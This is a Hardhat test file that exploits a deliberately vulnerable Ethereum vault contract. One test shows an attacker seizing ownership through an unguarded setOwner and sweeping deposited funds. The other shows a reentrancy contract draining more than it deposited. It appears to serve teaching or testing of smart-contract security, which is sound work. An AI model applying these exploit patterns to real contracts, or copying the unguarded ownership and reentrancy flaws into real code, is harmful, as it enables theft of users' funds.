const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("VulnerableVault — attacks", function () {
  let vault, deployer, victim, attacker;

  beforeEach(async function () {
    [deployer, victim, attacker] = await ethers.getSigners();
    const Factory = await ethers.getContractFactory("VulnerableVault");
    vault = await Factory.deploy();
    await vault.waitForDeployment();

    // the victim deposits 5 ETH of value
    await vault.connect(victim).deposit({ value: ethers.parseEther("5") });
  });

  it("ATTACK: anyone can seize ownership and sweep the vault", async function () {
    expect(await vault.owner()).to.equal(deployer.address);

    // attacker takes ownership — no guard on setOwner
    await vault.connect(attacker).setOwner(attacker.address);
    expect(await vault.owner()).to.equal(attacker.address);

    const before = await ethers.provider.getBalance(attacker.address);
    await vault.connect(attacker).sweep(attacker.address);
    const after = await ethers.provider.getBalance(attacker.address);

    expect(after).to.be.greaterThan(before);
  });

  it("ATTACK: reentrancy drains more than the attacker deposited", async function () {
    const Reenter = await ethers.getContractFactory("Reenterer");
    const bomb = await Reenter.deploy(await vault.getAddress());
    await bomb.waitForDeployment();
  
    // vault holds the victim's 5 ETH; attacker commits only 1
    await bomb.attack({ value: ethers.parseEther("1") });
  
    const drained = await ethers.provider.getBalance(await bomb.getAddress());
    expect(drained).to.be.greaterThan(ethers.parseEther("1"));
  });
});

